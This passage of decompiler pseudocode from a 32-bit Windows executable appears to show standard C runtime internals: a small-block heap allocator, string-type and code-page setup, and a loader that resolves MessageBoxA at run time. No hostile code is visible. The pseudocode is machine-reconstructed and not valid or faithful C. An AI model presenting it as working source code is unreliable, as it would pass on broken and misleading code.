                 *(_t165 + 68 + _t285 * 4) =  *(_t165 + 68 + _t285 * 4) & -2147483648;
                 *_t249 =  *_t249 - 1;
                if( *_t249 == 0) {
                     *_a4 =  *_a4 & _t282;
                }
            }
        }
         *((intOrPtr*)( *((intOrPtr*)(_t183 + _t252 + 8)) + 4)) =  *((intOrPtr*)(_t183 + _t252 + 4));
        _t243 =  *((intOrPtr*)(_t183 + _t252 + 4));
        _t276 =  *((intOrPtr*)(_t183 + _t252 + 8));
        _t183 = _t183 + _v12;
         *((intOrPtr*)(_t243 + 8)) = _t276;
        _v16 = _t183;
        goto L10;
    }
}

signed int L0040C299(
    signed int _a4,                        // _cfa_4
    char _a7                               // _cfa_7
)
{
    signed int _v8;                        // _cfa_fffffff8
    signed int _v12;                       // _cfa_fffffff4
    signed int _v16;                       // _cfa_fffffff0
    signed int _v20;                       // _cfa_ffffffec
    signed int _v24;                       // _cfa_ffffffe8
    _unknown_ __ebx;                       // r1
    _unknown_ __edi;                       // r4
    _unknown_ __esi;                       // r5
    signed int _t156;                      // _t156
    signed int _t158;                      // _t158
    signed int _t159;                      // _t159
    signed int* _t160;                     // _t160
    signed int _t166;                      // _t166
    signed int _t175;                      // _t175
    signed int* _t178;                     // _t178
    signed int _t183;                      // _t183
    signed int _t186;                      // _t186
    intOrPtr _t187;                        // _t187
    signed int _t188;                      // _t188
    signed int _t194;                      // _t194
    signed int _t195;                      // _t195
    char _t198;                            // _t198
    signed int _t223;                      // _t223
    signed int _t224;                      // _t224
    signed int* _t228;                     // _t228
    intOrPtr* _t229;                       // _t229
    signed int _t231;                      // _t231
    signed int _t233;                      // _t233
    signed int _t234;                      // _t234
    signed int* _t239;                     // _t239
    signed int* _t246;                     // _t246
    signed int* _t247;                     // _t247
    signed int _t256;                      // _t256
    signed int _t257;                      // _t257
    signed int _t262;                      // _t262
    signed int _t263;                      // _t263
    signed int _t264;                      // _t264

    _t223 =  *4304316;
    _t233 = _t223 + ( *4304312 +  *4304312 * 4) * 4;
    _t156 = _a4;
    _v8 = _t233;
    _t175 = _t156 + 23 & -16;
    _v20 = _t175;
    _t177 = (_t175 >> 4) - 1;
    if(_t177 >= 32) {
        _t177 = _t177 + -32;
        _t257 = 0;
        _t158 = (_t156 | -1) >> _t177;
        __eflags = _t158;
        _v16 = 0;
        _v12 = _t158;
    } else {
        _t257 = (_t256 | -1) >> _t177;
        _v12 = _v12 | -1;
        _v16 = _t257;
    }
    _t159 =  *4304304;
    _t166 = _t159;
    _a4 = _t166;
    if(_t166 >= _t233) {
L6:
        if(_t166 != _v8) {
L27:
             *4304304 = _t166;
            _t160 =  *(_t166 + 16);
            _t224 =  *_t160;
            __eflags = _t224 - -1;
            _v8 = _t224;
            if(_t224 == -1) {
L29:
                _v8 = 0;
                _t178 =  &(_t160[0x11]);
                __eflags = _t160[0x31] & _v12 | _t160[0x11] & _v16;
                _t257 = _v16;
                if((_t160[0x31] & _v12 | _t160[0x11] & _v16) != 0) {
L31:
                    _t224 = _v8;
L32:
                    _t234 = 0;
                    _v16 =  &(_t160[0x51]) + _t224 * 516;
                    _t183 =  *(_t160 + 68 + _t224 * 4) & _t257;
                    __eflags = _t183;
                    if(_t183 == 0) {
                        _push(32);
                        _t183 =  *(_t160 + 196 + _t224 * 4) & _v12;
                        __eflags = _t183;
                        _pop(__edi);
                    }
                    while(1) {
                        __eflags = _t183;
                        if(_t183 < 0) {
                            break;
                        }
                        _t183 = _t183 << 1;
                        _t234 = _t234 + 1;
                    }
                    _t228 =  *(_v16 + 4 + _t234 * 8);
                    _t186 =  *_t228 - _v20;
                    _v12 = _t186;
                    _t262 = (_t186 >> 4) - 1;
                    __eflags = _t262 - 63;
                    if(_t262 > 63) {
                        _push(63);
                        _pop(__esi);
                    }
                    __eflags = _t262 - _t234;
                    if(_t262 == _t234) {
L56:
                        __eflags = _t186;
                        if(_t186 != 0) {
                             *_t228 = _t186;
                             *(_t186 + _t228 - 4) = _t186;
                        }
                        goto L59;
                    } else {
                        __eflags = _t228[1] - _t228[2];
                        if(_t228[1] != _t228[2]) {
L46:
                            __eflags = _v12;
                             *(_t228[2] + 4) = _t228[1];
                             *(_t228[1] + 8) = _t228[2];
                            if(_v12 == 0) {
                                _t186 = _v12;
L59:
                                _t263 = _v20;
                                _t229 = _t228 + _t186;
                                _t187 = _t263 + 1;
                                 *_t229 = _t187;
                                 *((intOrPtr*)(_t229 + _t263 - 4)) = _t187;
                                _t264 = _v16;
                                _t188 =  *_t264;
                                __eflags = _t188;
                                 *_t264 = _t188 + 1;
                                if(_t188 == 0) {
                                    __eflags = _t166 -  *4304308;
                                    if(_t166 ==  *4304308) {
                                        __eflags = _v8 -  *4304300;
                                        if(_v8 ==  *4304300) {
                                             *4304308 = 0;
                                            __eflags =  *4304308;
                                        }
                                    }
                                }
                                 *_t160 = _v8;
                                return _t229 + 4;
                            }
                            _t194 = _v16;
                            _t195 = _t194 + _t262 * 8;
                            _t228[1] =  *(_t194 + 4 + _t262 * 8);
                            _t228[2] = _t195;
                             *(_t195 + 4) = _t228;
                             *(_t228[1] + 8) = _t228;
                            __eflags = _t228[1] - _t228[2];
                            if(_t228[1] == _t228[2]) {
                                _t198 =  *((intOrPtr*)( &(_t160[1]) + _t262));
                                __eflags = _t262 - 32;
                                _a7 = _t198;
                                if(_t262 >= 32) {
                                    __eflags = _a7;
                                     *((char*)( &(_t160[1]) + _t262)) = _t198 + 1;
                                    if(_a7 == 0) {
                                        _t134 = _t166 + 4;
                                         *_t134 =  *(_t166 + 4) | -2147483648 >> _t262 - 32;
                                        __eflags =  *_t134;
                                    }
                                    _t239 = _t160 + 196 + _v8 * 4;
                                     *_t239 =  *_t239 | -2147483648 >> _t262 - 32;
                                    __eflags =  *_t239;
                                } else {
                                    __eflags = _a7;
                                     *((char*)( &(_t160[1]) + _t262)) = _t198 + 1;
                                    if(_a7 == 0) {
                                         *_t166 =  *_t166 | -2147483648 >> _t262;
                                        __eflags =  *_t166;
                                    }
                                     *(_t160 + 68 + _v8 * 4) =  *(_t160 + 68 + _v8 * 4) | -2147483648 >> _t262;
                                }
                            }
                            _t186 = _v12;
                            goto L56;
                        }
                        __eflags = _t234 - 32;
                        if(_t234 >= 32) {
                            _t246 = _t160 + _t234 + 4;
                             *(_t160 + 196 + _v8 * 4) =  *(_t160 + 196 + _v8 * 4) & -2147483648;
                             *_t246 =  *_t246 - 1;
                            __eflags =  *_t246;
                            _v24 =  !(-2147483648 >> _t234 - 32);
                            if( *_t246 != 0) {
L45:
                                _t166 = _a4;
                                goto L46;
                            }
                            _t166 = _a4;
                             *(_t166 + 4) =  *(_t166 + 4) & _v24;
                            goto L46;
                        }
                        _t247 = _t160 + _t234 + 4;
                        _v24 = -2147483648;
                         *(_t160 + 68 + _v8 * 4) =  !(-2147483648 >> _t234) &  *(_t160 + 68 + _v8 * 4);
                         *_t247 =  *_t247 - 1;
                        __eflags =  *_t247;
                        if( *_t247 != 0) {
                            goto L45;
                        }
                        _t166 = _a4;
                         *_t166 =  *_t166 & _v24;
                        goto L46;
                    }
                } else {
                    goto L30;
                }
                do {
L30:
                    _v8 = _v8 + 1;
                    _t231 = _t178[0x21] & _v12;
                    _t178 =  &(_t178[1]);
                    __eflags = _t231 | _t257 &  *_t178;
                } while((_t231 | _t257 &  *_t178) == 0);
                goto L31;
            }
            __eflags =  *(_t160 + 196 + _t224 * 4) & _v12 |  *(_t160 + 68 + _t224 * 4) & _t257;
            if(( *(_t160 + 196 + _t224 * 4) & _v12 |  *(_t160 + 68 + _t224 * 4) & _t257) != 0) {
                goto L32;
            }
            goto L29;
        } else {
            _t166 = _t223;
            while(1) {
                _a4 = _t166;
                if(_t166 >= _t159) {
                    break;
                }
                _t177 =  *(_t166 + 4) & _v12 |  *_t166 & _t257;
                if(( *(_t166 + 4) & _v12 |  *_t166 & _t257) != 0) {
                    __eflags = _t166 - _t159;
                    break;
                } else {
                    _t166 = _t166 + 20;
                    continue;
                }
            }
            if(__eflags != 0) {
                goto L27;
            } else {
                goto L13;
            }
            while(1) {
L13:
                __eflags = _t166 - _v8;
                if(__eflags >= 0) {
                    break;
                }
                __eflags =  *(_t166 + 8);
                if( *(_t166 + 8) != 0) {
                    __eflags = _t166 - _v8;
                    break;
                } else {
                    _t166 = _t166 + 20;
                    _a4 = _t166;
                    continue;
                }
            }
            if(__eflags != 0) {
L25:
                 *( *(_t166 + 16)) = L0040C653(_t177, _t166);
                __eflags =  *( *(_t166 + 16)) - -1;
                if( *( *(_t166 + 16)) != -1) {
                    goto L27;
                }
L26:
                return 0;
            }
            _t166 = _t223;
            while(1) {
                __eflags = _t166 - _t159;
                _a4 = _t166;
                if(__eflags >= 0) {
                    break;
                }
                __eflags =  *(_t166 + 8);
                if( *(_t166 + 8) != 0) {
                    __eflags = _t166 - _t159;
                    break;
                }
                _t166 = _t166 + 20;
            }
            if(__eflags != 0) {
                goto L25;
            }
            _t166 = L0040C5A2();
            __eflags = _t166;
            _a4 = _t166;
            if(_t166 == 0) {
                goto L26;
            }
            goto L25;
        }
    } else {
        while(1) {
            _t177 =  *(_t166 + 4) & _v12 |  *_t166 & _t257;
            if(( *(_t166 + 4) & _v12 |  *_t166 & _t257) != 0) {
                goto L6;
            }
            _t166 = _t166 + 20;
            _a4 = _t166;
            if(_t166 < _v8) {
                continue;
            }
            goto L6;
        }
        goto L6;
    }
}

L0040C5A2()
{
    intOrPtr* __esi;                       // r5
    signed int _t15;                       // _t15
    signed int _t16;                       // _t16
    signed int _t21;                       // _t21
    signed int _t22;                       // _t22

    _t15 =  *4304312;
    _t22 =  *4304296;
    if(_t15 != _t22) {
L3:
        _push(16836);
        _push(8);
        _t16 = _t15 + _t15 * 4;
        _push( *4304320);
        __esi =  *4304316 + _t16 * 4;
        __imp__HeapAlloc();
         *(__esi + 16) = _t16;
        if(_t16 == 0) {
L6:
            return 0;
        }
        _push(4);
        _push(8192);
        _push(1048576);
        _push(0);
        __imp__VirtualAlloc();
         *(__esi + 12) = _t16;
        if(_t16 != 0) {
             *(__esi + 8) =  *(__esi + 8) | -1;
             *__esi = 0;
            __esi[1] = 0;
             *4304312 =  *4304312 + 1;
             *( *(__esi + 16)) =  *((signed int*)( *(__esi + 16))) | -1;
            return __esi;
        }
        _push( *(__esi + 16));
        _push(0);
        _push( *4304320);
        __imp__HeapFree();
        goto L6;
    }
    _t21 = _t22 + 80 + _t22 * 4 << 2;
    _push(_t21);
    _push( *4304316);
    _push(0);
    _push( *4304320);
    __imp__HeapReAlloc();
    if(_t21 == 0) {
        goto L6;
    }
     *4304296 =  *4304296 + 16;
     *4304316 = _t21;
    _t15 =  *4304312;
    goto L3;
}

signed int L0040C653(
    _unknown_ __ecx,                       // r2
    intOrPtr _a4                           // _cfa_4
)
{
    signed int _v8;                        // _cfa_fffffff8
    _unknown_ __ebx;                       // r1
    _unknown_ __edi;                       // r4
    _unknown_ __esi;                       // r5
    signed int _t45;                       // _t45
    signed int _t48;                       // _t48
    intOrPtr _t50;                         // _t50
    intOrPtr _t51;                         // _t51
    intOrPtr _t52;                         // _t52
    signed int _t53;                       // _t53
    intOrPtr* _t54;                        // _t54
    _unknown_ _t55;                        // _t55
    signed int _t56;                       // _t56
    intOrPtr _t58;                         // _t58
    intOrPtr _t59;                         // _t59
    intOrPtr _t60;                         // _t60
    _unknown_ _t67;                        // _t67
    _unknown_ _t68;                        // _t68
    _unknown_ _t72;                        // _t72
    signed int _t75;                       // _t75
    _unknown_ _t76;                        // _t76
    intOrPtr _t77;                         // _t77

    _push(__ecx);
    _t58 = _a4;
    _push(_t55);
    _push(_t76);
    _push(_t72);
    _t77 =  *((intOrPtr*)(_t58 + 16));
    _t45 =  *(_t58 + 8);
    _t56 = 0;
    while(_t45 >= 0) {
        _t45 = _t45 << 1;
        _t56 = _t56 + 1;
    }
    _push(63);
    _pop(__edx);
    _t48 = _t56 * 516 + _t77 + 324;
    _v8 = _t48;
    do {
         *(_t48 + 8) = _t48;
         *(_t48 + 4) = _t48;
        _t48 = _t48 + 8;
        _t67 = _t67 - 1;
    } while(_t67 != 0);
    _push(4);
    _t75 = (_t56 << 15) +  *((intOrPtr*)(_t58 + 12));
    _push(4096);
    _push(32768);
    _push(_t75);
    __imp__VirtualAlloc();
    if(_t48 != 0) {
        _t68 = _t75 + 28672;
        if(_t75 <= _t68) {
            _t54 = _t75 + 16;
            do {
                 *(_t54 - 8) =  *(_t54 - 8) | -1;
                 *(_t54 + 4076) =  *(_t54 + 4076) | -1;
                 *((intOrPtr*)(_t54 - 4)) = 4080;
                 *_t54 = _t54 + 4092;
                _t54[1] = _t54 - 4100;
                _t54[0x3fa] = 4080;
                _t54 = _t54 + 4096;
            } while(_t54 - 16 <= _t68);
        }
        _t59 = _t75 + 12;
        _t50 = _v8 + 504;
        _push(1);
        _pop(__edi);
         *((intOrPtr*)(_t50 + 4)) = _t59;
         *((intOrPtr*)(_t59 + 8)) = _t50;
        _t60 = _t68 + 12;
         *((intOrPtr*)(_t50 + 8)) = _t60;
         *((intOrPtr*)(_t60 + 4)) = _t50;
         *((intOrPtr*)(_t77 + 68 + _t56 * 4)) = 0;
         *(_t77 + 196 + _t56 * 4) = _t75;
        _t51 =  *((intOrPtr*)(_t77 + 67));
        _t52 = _a4;
         *((char*)(_t77 + 67)) = _t51 + 1;
        if(_t51 == 0) {
             *(_t52 + 4) =  *(_t52 + 4) | _t75;
        }
         *(_t52 + 8) =  *(_t52 + 8) &  !(-2147483648 >> _t56);
        _t53 = _t56;
    } else {
        _t53 = _t48 | -1;
    }
    _pop(__edi);
    _pop(__esi);
    _pop(__ebx);
    return _t53;
}

L0040CA44(
    intOrPtr _a4,                          // _cfa_4
    intOrPtr _a8,                          // _cfa_8
    intOrPtr _a12,                         // _cfa_c
    intOrPtr _a16,                         // _cfa_10
    intOrPtr _a20,                         // _cfa_14
    intOrPtr _a24,                         // _cfa_18
    signed int _a28                        // _cfa_1c
)
{
    signed int _v8;                        // _cfa_fffffff8
    intOrPtr _v20;                         // _cfa_ffffffec
    char* _v28;                            // _cfa_ffffffe4
    char _v32;                             // _cfa_ffffffe0
    intOrPtr _v36;                         // _cfa_ffffffdc
    signed int _v40;                       // _cfa_ffffffd8
    char _v56;                             // _cfa_ffffffc8
    _unknown_ __ebx;                       // r1
    signed int __edi;                      // r4
    signed int __esi;                      // r5
    char* _t31;                            // _t31
    signed int _t32;                       // _t32
    intOrPtr _t36;                         // _t36
    _unknown_ _t43;                        // _t43
    _unknown_ _t45;                        // _t45

    _push(-1);
    _push(4253952);
    _push(4236164);
    _push( *fs:0x0]);
     *fs:0x0] = __esp;
    __esp = __esp - 24;
    _push(_t43);
    _push(__esi);
    _push(__edi);
    _v28 = __esp;
    _t31 =  *4303344;
    if(_t31 != 0) {
L6:
        if(_t31 != 2) {
            if(_t31 != 1) {
                goto L18;
            } else {
                if(_a20 == 0) {
                    _a20 =  *4303388;
                }
                _push(0);
                _push(0);
                _push(_a12);
                _push(_a8);
                asm("sbb eax, eax");
                _t36 = ( ~_a28 & 8) + 1;
                _push(_t36);
                _push(_a20);
                __imp__MultiByteToWideChar();
                _v36 = _t36;
                if(_t36 == 0) {
                    goto L18;
                } else {
                    _v8 = 0;
                    __edi = _t36 + _t36;
                    L0040A560(_t36 + _t36 + 3 & 252, _t45);
                    _v28 = __esp;
                    __esi = __esp;
                    _v40 = __esi;
                    _t32 = L0040A590(__esi, 0, __edi);
                    _v8 = _v8 | -1;
                    if(__esi == 0) {
                        goto L18;
                    } else {
                        _push(_v36);
                        _push(__esi);
                        _push(_a12);
                        _push(_a8);
                        _push(1);
                        _push(_a20);
                        __imp__MultiByteToWideChar();
                        if(_t32 == 0) {
                            goto L18;
                        } else {
                            _push(_a16);
                            _push(_t32);
                            _push(__esi);
                            _push(_a4);
                            __imp__GetStringTypeW();
                        }
                    }
                }
            }
        } else {
            _t32 = _a24;
            if(_t32 == 0) {
                _t32 =  *4303372;
            }
            _push(_a16);
            _push(_a12);
            _push(_a8);
            _push(_a4);
            _push(_t32);
            __imp__GetStringTypeA();
        }
    } else {
        _push( &_v32);
        _push(1);
        _pop(__esi);
        _push(__esi);
        _push(4253948);
        _push(__esi);
        __imp__GetStringTypeW();
        if( &_v32 == 0) {
            _t31 =  &_v32;
            _push( &_v32);
            _push(__esi);
            _push(4253944);
            _push(__esi);
            _push(0);
            __imp__GetStringTypeA();
            if( &_v32 == 0) {
L18:
                _t32 = 0;
            } else {
                _push(2);
                _pop(__eax);
                goto L5;
            }
        } else {
            _t31 = __esi;
L5:
             *4303344 = _t31;
            goto L6;
        }
    }
    __esp =  &_v56;
     *fs:0x0] = _v20;
    _pop(__edi);
    _pop(__esi);
    _pop(__ebx);
    return _t32;
}

L0040CB8D(
    signed int _a4,                        // _cfa_4
    signed int _a8                         // _cfa_8
)
{
    signed int __ebx;                      // r1
    signed int __edi;                      // r4
    _unknown_ __esi;                       // r5
    signed int _t3;                        // _t3
    signed int _t7;                        // _t7
    signed int _t10;                       // _t10

    _t10 = _a4 * _a8;
    __ebx = _t10;
    if(_t10 <= -32) {
        if(_t10 == 0) {
            _push(1);
            _pop(__esi);
        }
        _t10 = _t10 + 15 & -16;
    }
    while(1) {
        __edi = 0;
        if(_t10 > -32) {
            goto L8;
        }
        if(__ebx >  *4270280) {
L7:
            _push(_t10);
            _push(8);
            _push( *4304320);
            __imp__HeapAlloc();
            __edi = _t3;
            if(__edi != 0) {
L12:
                return __edi;
            }
            goto L8;
        }
        L0040BE8F();
        _push(__ebx);
        _t7 = L0040C299();
        _push(9);
        __edi = _t7;
        _t3 = L0040BEF0(9);
        __esp = __esp + 12;
        if(__edi != 0) {
            L0040A590(__edi, 0, __ebx);
            goto L12;
        }
        goto L7;
L8:
        if( *4303236 == 0) {
            goto L12;
        }
        _t3 = L0040BE4B(_t10);
        if(_t3 == 0) {
            return 0;
        }
    }
}

L0040CC1A(
    intOrPtr _a4                           // _cfa_4
)
{
    return L0040CC2B(__ecx, _a4, 0, 4);
}

signed int L0040CC2B(
    _unknown_ __ecx,                       // r2
    signed char _a4,                       // _cfa_4
    signed int _a8,                        // _cfa_8
    signed int _a12                        // _cfa_c
)
{
    signed int _t10;                       // _t10

    _t10 = _a4 & 255;
    if(( *(_t10 + 4304033) & _a12) != 0) {
L6:
        _push(1);
        _pop(__eax);
        return _t10;
    } else {
        if(_a8 == 0) {
            _t10 = 0;
        } else {
            _t10 =  *(4269234 + _t10 * 2) & 65535 & _a8;
        }
        if(_t10 != 0) {
            goto L6;
        } else {
            return _t10;
        }
    }
}

signed int L0040CC5C(
    intOrPtr _a4                           // _cfa_4
)
{
    intOrPtr _v8;                          // _cfa_fffffff8
    char _v21;                             // _cfa_ffffffeb
    char _v22;                             // _cfa_ffffffea
    char _v28;                             // _cfa_ffffffe4
    _unknown_ __ebx;                       // r1
    _unknown_ __edi;                       // r4
    _unknown_ __esi;                       // r5
    intOrPtr* _t36;                        // _t36
    intOrPtr _t38;                         // _t38
    intOrPtr _t39;                         // _t39
    signed int _t40;                       // _t40
    signed int _t44;                       // _t44
    signed int _t46;                       // _t46
    intOrPtr _t47;                         // _t47
    signed int _t48;                       // _t48
    signed int _t49;                       // _t49
    signed int _t53;                       // _t53
    signed char _t54;                      // _t54
    signed char _t56;                      // _t56
    signed char _t57;                      // _t57
    signed int _t58;                       // _t58
    signed int _t62;                       // _t62
    signed int _t65;                       // _t65
    signed int _t66;                       // _t66

    _push(25);
    L0040BE8F();
    _t47 = L0040CE09(_a4);
    _a4 = _t47;
    if(_t47 !=  *4303736) {
        if(_t47 == 0) {
L30:
            L0040CE86();
        } else {
            _t53 = 0;
            _t36 = 4270296;
            while( *_t36 != _t47) {
                _t36 = _t36 + 48;
                _t53 = _t53 + 1;
                if(_t36 < 4270536) {
                    continue;
                } else {
                    _push( &_v28);
                    _push(_t47);
                    __imp__GetCPInfo();
                    _push(1);
                    _pop(__esi);
                    if( &_v28 != _t65) {
                        if( *4303348 == 0) {
                            _t66 = _t65 | -1;
                        } else {
                            goto L30;
                        }
                    } else {
                        _push(64);
                         *4304292 = 0;
                        _pop(__ecx);
                        _push(_t49 << 2);
                        _push(0);
                        _push(4304032);
                        memset();
                        __esp = __esp + 12;
                        _t49 = 0;
                        asm("stosb");
                         *4303736 = _t47;
                        if(_v28 <= _t65) {
                             *4303756 = 0;
                        } else {
                            if(_v22 != 0) {
                                _t49 =  &_v21;
                                while(1) {
                                    _t57 =  *_t49;
                                    if(_t57 == 0) {
                                        goto L24;
                                    }
                                    _t46 =  *(_t49 - 1) & 255;
                                    _t58 = _t57 & 255;
                                    while(_t46 <= _t58) {
                                         *(_t46 + 4304033) =  *(_t46 + 4304033) | 4;
                                        _t46 = _t46 + 1;
                                    }
                                    _t49 = _t49 + 2;
                                    if( *(_t49 - 1) != 0) {
                                        continue;
                                    }
                                    goto L24;
                                }
                            }
L24:
                            _t44 = _t65;
                            do {
                                 *(_t44 + 4304033) =  *(_t44 + 4304033) | 8;
                                _t44 = _t44 + 1;
                            } while(_t44 < 255);
                             *4304292 = L0040CE53(_t47);
                             *4303756 = _t65;
                        }
                        asm("stosd");
                        asm("stosd");
                        asm("stosd");
L31:
                        L0040CEAF(_t47, 4303744);
                        goto L1;
                    }
                }
                goto L33;
            }
            _v8 = 0;
            _push(64);
            _pop(__ecx);
            _push(_t49 << 2);
            _push(0);
            _push(4304032);
            memset();
            __esp = __esp + 12;
            asm("stosb");
            _t48 = (_t53 + _t53 * 2 << 4) + 4270312;
            do {
                _t49 = _t48;
                if( *_t48 != 0) {
                    while(1) {
                        _t54 =  *((intOrPtr*)(_t49 + 1));
                        if(_t54 == 0) {
                            goto L21;
                        }
                        _t40 =  *_t49 & 255;
                        _t62 = _t54 & 255;
                        if(_t40 <= _t62) {
                            _t56 =  *((intOrPtr*)(_v8 + 4270288));
                            do {
                                 *(_t40 + 4304033) =  *(_t40 + 4304033) | _t56;
                                _t40 = _t40 + 1;
                            } while(_t40 <= _t62);
                        }
                        _t49 = _t49 + 2;
                        if( *_t49 != 0) {
                            continue;
                        }
                        goto L21;
                    }
                }
L21:
                _v8 = _v8 + 1;
                _t48 = _t48 + 8;
            } while(_v8 < 4);
            _t38 = _a4;
             *4303756 = 1;
            _push(_t38);
             *4303736 = _t38;
            _t39 = L0040CE53();
            asm("movsd");
            asm("movsd");
            _pop(__ecx);
             *4304292 = _t39;
            asm("movsd");
        }
        goto L31;
    } else {
L1:
        _t66 = 0;
    }
L33:
    L0040BEF0(25);
    return _t66;
}

L0040CE09(
    intOrPtr _a4                           // _cfa_4
)
{
    intOrPtr _t2;                          // _t2

    _t2 = _a4;
     *4303348 = 0;
    if(_t2 == -2) {
         *4303348 = 1;
        goto __imp__GetOEMCP;
    }
    if(_t2 == -3) {
         *4303348 = 1;
        goto __imp__GetACP;
    }
    if(_t2 == -4) {
         *4303348 = 1;
        return  *4303388;
    }
    return _t2;
}

L0040CE53(
    intOrPtr _a4                           // _cfa_4
)
{
    _unknown_ _t3;                         // _t3
    _unknown_ _t5;                         // _t5
    _unknown_ _t7;                         // _t7

    _t3 = _a4 - 932;
    if(_t3 == 0) {
        return 1041;
    } else {
        _t5 = _t3 - 4;
        if(_t5 == 0) {
            return 2052;
        } else {
            _t7 = _t5 - 13;
            if(_t7 == 0) {
                return 1042;
            } else {
                if(_t7 == 1) {
                    return 1028;
                } else {
                    return 0;
                }
            }
        }
    }
}

L0040CE86()
{
    _unknown_ __edi;                       // r4
    signed int _t4;                        // _t4

    _push(64);
    _pop(__ecx);
    _push(_t4 << 2);
    _push(0);
    _push(4304032);
    memset();
    __esp = __esp + 12;
    asm("stosb");
     *4303736 = 0;
     *4303756 = 0;
     *4304292 = 0;
    asm("stosd");
    asm("stosd");
    asm("stosd");
    return 0;
}

L0040CEAF(
    signed int __ebx,                      // r1
    _unknown_ __edi                        // r4
)
{
    char _v17;                             // _cfa_ffffffef
    signed char _v18;                      // _cfa_ffffffee
    char _v24;                             // _cfa_ffffffe8
    char _v280;                            // _cfa_fffffee8
    char _v536;                            // _cfa_fffffde8
    char _v792;                            // _cfa_fffffce8
    char _v1304;                           // _cfa_fffffae8
    _unknown_ __esi;                       // r5
    char _t42;                             // _t42
    char _t43;                             // _t43
    signed char _t44;                      // _t44
    _unknown_ _t54;                        // _t54
    signed int _t55;                       // _t55
    char _t58;                             // _t58
    intOrPtr* _t60;                        // _t60
    signed int _t62;                       // _t62
    signed int _t64;                       // _t64
    signed int _t65;                       // _t65
    signed int _t68;                       // _t68
    signed char _t70;                      // _t70
    char _t71;                             // _t71
    signed char* _t72;                     // _t72
    _unknown_ _t74;                        // _t74
    _unknown_ _t75;                        // _t75
    _unknown_ _t76;                        // _t76

    _t74 = __edi;
    __ebx = __ebx;
    _push( &_v24);
    _push( *4303736);
    __imp__GetCPInfo();
    if( &_v24 != 1) {
        _t42 = 0;
        do {
            if(_t42 < 65 || _t42 > 90) {
                if(_t42 < 97 || _t42 > 122) {
                     *((char*)(_t42 + 4303776)) = 0;
                    goto L27;
                } else {
                     *(_t42 + 4304033) =  *(_t42 + 4304033) | 32;
                    _t58 = _t42 - 32;
                    goto L22;
                }
            } else {
                 *(_t42 + 4304033) =  *(_t42 + 4304033) | 16;
                _t58 = _t42 + 32;
L22:
                 *((char*)(_t42 + 4303776)) = _t58;
            }
L27:
            _t42 = _t42 + 1;
        } while(_t42 < 256);
        return _t42;
    } else {
        _t43 = 0;
        do {
             *((char*)(__ebp + _t43 - 276)) = _t43;
            _t43 = _t43 + 1;
        } while(_t43 < 256);
        _t44 = _v18;
        _v280 = 32;
        if(_t44 == 0) {
L9:
            _push(0);
            _push( *4304292);
            _push( *4303736);
            _push( &_v1304);
            _push(256);
            _push( &_v280);
            _push(1);
            L0040CA44();
            _push(0);
            _push( *4303736);
            _push(256);
            _push( &_v536);
            _push(256);
            _push( &_v280);
            _push(256);
            _push( *4304292);
            L0040D415();
            L0040D415( *4304292, 512,  &_v280, 256,  &_v792, 256,  *4303736, 0);
            __esp = __esp + 60;
            _t54 = 0;
            _t60 =  &_v1304;
            do {
                _t70 =  *_t60;
                if((_t70 & 1) == 0) {
                    if((_t70 & 2) == 0) {
                         *((char*)(_t54 + 4303776)) = 0;
                        goto L16;
                    }
                     *(_t54 + 4304033) =  *(_t54 + 4304033) | 32;
                    _t71 =  *((intOrPtr*)(__ebp + _t54 - 788));
L12:
                     *((char*)(_t54 + 4303776)) = _t71;
                    goto L16;
                }
                 *(_t54 + 4304033) =  *(_t54 + 4304033) | 16;
                _t71 =  *((intOrPtr*)(__ebp + _t54 - 532));
                goto L12;
L16:
                _t54 = _t54 + 1;
                _t60 = _t60 + 2;
            } while(_t54 < 256);
            return _t54;
        }
        _push(__ebx);
        _push(_t74);
        _t72 =  &_v17;
        do {
            _t62 =  *_t72 & 255;
            _t55 = _t44 & 255;
            if(_t55 <= _t62) {
                _t75 = __ebp + _t55 - 276;
                _t64 = _t62 - _t55 + 1;
                __ebx = _t64;
                _t65 = _t64 >> 2;
                _push(_t65 << 2);
                _push(538976288);
                _push(_t75);
                memset();
                __esp = __esp + 12;
                _t76 = _t75 + _t65;
                _t68 = _t64 & 3;
                _push(_t68 << 0);
                _push(538976288);
                _push(_t76);
                memset();
                __esp = __esp + 12;
                _t74 = _t76 + _t68;
            }
            _t72 =  &(_t72[2]);
            _t44 =  *((intOrPtr*)(_t72 - 1));
        } while(_t44 != 0);
        _pop(__edi);
        _pop(__ebx);
        goto L9;
    }
}

L0040D034()
{
    _unknown_ _t1;                         // _t1
    signed int _t2;                        // _t2

    if( *4304616 == 0) {
        _t2 = L0040CC5C(-3);
         *4304616 = 1;
        return _t2;
    }
    return _t1;
}

L0040D050(
    intOrPtr __eax,                        // r0
    intOrPtr _a4,                          // _cfa_4
    intOrPtr _a8,                          // _cfa_8
    intOrPtr _a12                          // _cfa_c
)
{
    intOrPtr* __ebx;                       // r1
    intOrPtr __edi;                        // r4
    intOrPtr* __esi;                       // r5
    intOrPtr* _t5;                         // _t5

    __ebx = 0;
    _push(__esi);
    _push(__edi);
    if( *4303352 != 0) {
L4:
        _t5 =  *4303356;
        if(_t5 != 0) {
             *_t5();
            __ebx = _t5;
            if(__ebx != 0) {
                _t5 =  *4303360;
                if(_t5 != 0) {
                    _push(__ebx);
                     *_t5();
                    __ebx = _t5;
                }
            }
        }
        _push(_a12);
        _push(_a8);
        _push(_a4);
        _push(__ebx);
         *4303352();
L9:
        _pop(__edi);
        _pop(__esi);
        return _t5;
    }
    _push("user32.dll");
    __imp__LoadLibraryA();
    __edi = __eax;
    if(__eax == 0) {
L10:
        _t5 = 0;
        goto L9;
    }
    __esi = __imp__GetProcAddress;
    _push("MessageBoxA");
    _push(__eax);
     *__esi();
     *4303352 = __eax;
    if(__eax == 0) {
        goto L10;
    } else {
        _push("GetActiveWindow");
        _push(__eax);
         *__esi();
        _push("GetLastActivePopup");
        _push(__eax);
         *4303356 = __eax;
         *__esi();
         *4303360 = __eax;
        goto L4;
    }
}

signed int L0040D0E0(
    signed int _a4,                        // _cfa_4
    intOrPtr _a8,                          // _cfa_8
    signed int _a12                        // _cfa_c
)
{
    char* __edi;                           // r4
    intOrPtr* __esi;                       // r5
    _unknown_ _t104;                       // _t104
    signed int _t105;                      // _t105
    signed int _t115;                      // _t115
    signed int _t116;                      // _t116
    signed int _t118;                      // _t118
    signed int _t120;                      // _t120
    signed int _t121;                      // _t121
    signed int _t122;                      // _t122
    signed int _t123;                      // _t123
    signed int _t125;                      // _t125
    signed int _t126;                      // _t126
    signed int _t129;                      // _t129
    intOrPtr _t131;                        // _t131
    _unknown_ _t133;                       // _t133

    _t131 = _a8;
    _t119 = _a12;
